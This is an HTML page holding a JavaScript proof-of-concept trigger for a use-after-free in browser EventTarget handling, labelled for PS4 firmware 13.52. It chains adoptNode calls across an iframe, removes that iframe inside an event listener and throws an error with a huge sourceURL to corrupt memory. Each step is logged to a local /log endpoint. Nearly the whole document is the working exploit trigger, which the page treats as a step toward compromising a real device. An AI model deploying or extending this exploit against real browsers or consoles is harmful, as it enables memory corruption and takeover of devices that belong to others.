<!DOCTYPE html>
<html>
<body>
<p>EventTarget UAF PoC - Testing on PS4 FW 13.52</p>
<script>
function report(m) {
    try { var x = new XMLHttpRequest(); x.open('GET','/log?m='+encodeURIComponent(m),false); x.send(); } catch(e) {}
}
report('EventTarget PoC starting');

function main() {
    report('main: creating iframe');
    const f = document.body.appendChild(document.createElement('iframe'));
    
    report('main: creating divs');
    const a = document.createElement('div');
    const b = a.appendChild(document.createElement('div'));
    
    report('main: adding listener a1');
    a.addEventListener('a', eval(`(function () {
        report('listener a1: adoptNode + remove iframe');
        document.adoptNode(a);
        f.remove();
        report('listener a1: throwing error with huge sourceURL');
        throw {
            line: 1,
            column: 1,
            sourceURL: 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32)
        };
    })`));
    
    report('main: adding listener a2');
    a.addEventListener('a', () => {});
    
    report('main: adding listener b');
    b.addEventListener('a', () => {
        report('listener b: adoptNode from iframe');
        f.contentDocument.adoptNode(a);
    });
    
    report('main: dispatching event (trigger UAF)');
    b.dispatchEvent(new Event('a', { bubbles: true }));
    report('main: event dispatched - if you see this, no crash yet');
}

report('calling main()...');
try {
    main();
    report('main() returned - UAF may have succeeded');
} catch(e) {
    report('main() exception: ' + e.constructor.name + ': ' + (e.message || '').substring(0, 100));
}
report('EventTarget PoC done');
</script>
</body>
</html>
